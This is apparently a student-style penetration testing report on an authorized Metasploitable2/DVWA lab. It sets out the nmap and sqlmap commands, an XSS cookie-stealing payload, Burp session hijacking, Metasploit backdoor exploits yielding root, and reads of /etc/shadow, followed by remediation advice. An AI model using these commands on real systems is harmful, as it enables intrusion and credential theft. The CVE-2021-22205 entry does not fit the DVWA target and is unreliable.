## Vulnerability Assessment & Penetration Testing (VAPT) Report

Target: Metasploitable2
Attacker: Kali Linux
Network Mode: Host-Only Adapter
Scope: Authorized lab environment only

# 1. Objective

The objective of this project is to perform an end-to-end Vulnerability Assessment and Penetration Testing (VAPT) on a deliberately vulnerable system (Metasploitable2).
The assessment covers reconnaissance, vulnerability discovery, exploitation, post-exploitation, and evidence collection, following traditional penetration testing methodologies.

# 2. Lab Environment
| Component        | Details                      |
| ---------------- | ---------------------------- |
| Attacker Machine | Kali Linux                   |
| Target Machine   | Metasploitable2              |
| Network Type     | Host-Only                    |
| Target IP        | `192.168.56.101`             |
| Attacker IP      | `192.168.56.103`             |
| Tools Used       | Nmap, Burp Suite, Metasploit |

# 3. Reconnaissance & Enumeration
Tool Used

# Nmap

Command Executed
nmap -sC -sV -oA meta_scan 192.168.56.101

# Key Findings

Anonymous FTP enabled (vsftpd 2.3.4)

OpenSSH (outdated)

Telnet enabled

Apache HTTP Server

Samba 3.0.20

UnrealIRCd

MySQL, PostgreSQL

Tomcat, WebDAV, VNC

This confirmed that the target system exposes multiple high-risk network services.

# 4. Web Application Testing (DVWA)
Vulnerability Identified

| Component          | Details                                |
| ------------------ | -------------------------------------- |
| Attacker Machine   | Kali Linux                             |
| Target Application | DVWA (Damn Vulnerable Web Application) |
| Web Server         | Apache                                 |
| Backend Language   | PHP                                    |
| Database           | MySQL                                  |
| Network Mode       | Host-Only Adapter                      |
| Target URL         | `http://192.168.56.101/dvwa/`          |
| Tools Used         | Burp Suite, sqlmap          |

# Tool Used: sqlmap (Automated)

Command Executed
sqlmap -u "http://192.168.56.101/dvwa/login.php" --forms --batch

# Result

sqlmap successfully detected injectable parameters

Database interaction confirmed

Application vulnerable to SQL Injection

# Impact

Authentication bypass possible

Database contents could be extracted

High risk of data breach
Reflected Cross-Site Scripting (XSS)

# Payload Used
<script>alert(document.cookie)</script>

# Result

The payload executed successfully and leaked the session cookie:

security=low;
PHPSESSID=ca134a0927ca573296e83bdf3fd51b0e

| Finding                 | Description                        |
| ----------------------- | ---------------------------------- |
| CVE-2021-22205          | Unsafe file parsing leading to RCE |
| Reflected XSS           | Client-side script execution       |
| Weak Session Management | Session reuse without validation   |

This confirms:

Input is not sanitized

Cookies are accessible via JavaScript

Session protection is weak

# 5. Session Hijacking (Burp Suite)
Tool Used : Burp Suite (Repeater)

Exploitation Steps

Captured a valid DVWA request

Replaced the existing PHPSESSID with the stolen value

Sent the request using Repeater

Accessed authenticated endpoints successfully


# Proof of Impact

HTTP/1.1 200 OK received for /dvwa/security.php

No authentication prompt

Session fully trusted by server

# Exploit Chain
Reflected XSS → Cookie Theft → Session Hijacking → Unauthorized Access

# 6. Service-Level Exploitation (Remote Code Execution)
# Exploit #1 — FTP Backdoor

Service: vsftpd 2.3.4
Tool: Metasploit

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run

# Result
uid=0(root) gid=0(root)
Command shell session opened


✔ Remote Code Execution
✔ Root access achieved

# Exploit #2 — UnrealIRCd Backdoor

Service: UnrealIRCd 3.2.8.1
Tool: Metasploit

use exploit/unix/irc/unreal_ircd_3281_backdoor
run

# Result
whoami
root


✔ Second independent RCE
✔ Confirms systemic insecurity

# 7. Post-Exploitation Activities

Once root access was obtained, controlled post-exploitation was performed without modifying system files.

Commands Executed
ls /home
cat /etc/passwd
cat /etc/shadow
ip a
netstat -tulnp

# Findings

Multiple valid user accounts identified

Password hashes exposed

Numerous critical services running

Full system visibility achieved

# Impact

Confidentiality: Broken

Integrity: Broken

Availability: At risk

# 8. Evidence Collection & Integrity
Evidence Logging
script /tmp/post_exploit_evidence.txt

Hashing for Integrity
sha256sum /tmp/post_exploit_evidence.txt


SHA256 Hash:

5e285c4bc29b11351b049fd26c954c714663126d38a8ace474eddbda8756b4d1

Chain of Custody
| Evidence ID | Description                   | Hash   |
| ----------- | ----------------------------- | ------ |
| PE-01       | Post-Exploitation Command Log | SHA256 |

# 9. Vulnerability Summary Table
| ID   | Vulnerability           | Severity | Impact           |
| ---- | ----------------------- | -------- | ---------------- |
| V-01 | Reflected XSS           | Medium   | Session theft    |
| V-02 | Weak Session Management | High     | Account takeover |
| V-03 | vsftpd Backdoor         | Critical | Root RCE         |
| V-04 | UnrealIRCd Backdoor     | Critical | Root RCE         |

# 10. Remediation Recommendations

Patch or remove vulnerable services (vsftpd, UnrealIRCd)

Disable anonymous FTP

Sanitize and encode user input

Implement HttpOnly & Secure cookie flags

Enforce least-privilege access

Regular vulnerability scanning and patching

# 11. Conclusion

This assessment demonstrated a full system compromise through multiple independent attack paths.
Weak configurations, outdated services, and insecure session handling allowed attackers to escalate from web-level vulnerabilities to root-level system access.

The findings highlight the importance of:

Secure coding practices

Patch management

Defense-in-depth security architecture
